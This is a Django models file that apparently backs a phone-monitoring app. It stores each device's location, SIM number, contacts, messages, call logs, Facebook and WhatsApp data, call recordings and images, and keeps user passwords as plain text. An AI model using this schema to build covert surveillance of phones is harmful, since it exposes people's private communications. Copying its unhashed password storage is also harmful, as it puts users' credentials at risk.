from django.db import models



class User(models.Model):
    name = models.CharField(max_length=255)
    email = models.CharField(max_length=255)
    phonenumber = models.IntegerField()
    password = models.CharField(max_length=255)
    coupon = models.CharField(max_length=255)
    datetime = models.CharField(max_length=255)
    def __str__(self):
        return self.name


class Phonedata(models.Model):
    email = models.CharField(max_length=255,blank=True,null=True)
    devicename = models.CharField(max_length=255,blank=True,null=True)
    deviceid = models.CharField(max_length=255,blank=True,null=True)
    simnumber = models.CharField(max_length=255,blank=True,null=True)
    latitude = models.CharField(max_length=255,blank=True,null=True)
    longitude = models.CharField(max_length=255,blank=True,null=True)
    time = models.CharField(max_length=255,blank=True,null=True)
    contact = models.TextField(blank=True,null=True)
    message = models.TextField(blank=True,null=True)
    calllogs = models.TextField(blank=True,null=True)
    facebook = models.TextField(blank=True,null=True)
    whatsapp = models.TextField(blank=True,null=True)

    def __str__(self):
        return self.devicename

class Audio(models.Model):
    def deviceAudio(instance, filename):
        return '/'.join(['CallRecoding',str(instance.deviceid),filename])
    deviceid = models.CharField(max_length=255,blank=True,null=True);
    callrecoding = models.FileField(upload_to=deviceAudio)
    def __str__(self):
        return str(self.callrecoding)


class Image(models.Model):
    def deviceimage(instance, filename):
        return '/'.join(['Images',str(instance.deviceid),filename])
    deviceid = models.CharField(max_length=255,blank=True,null=True);
    image = models.ImageField(upload_to=deviceimage)
    def __str__(self):
        return str(self.image)
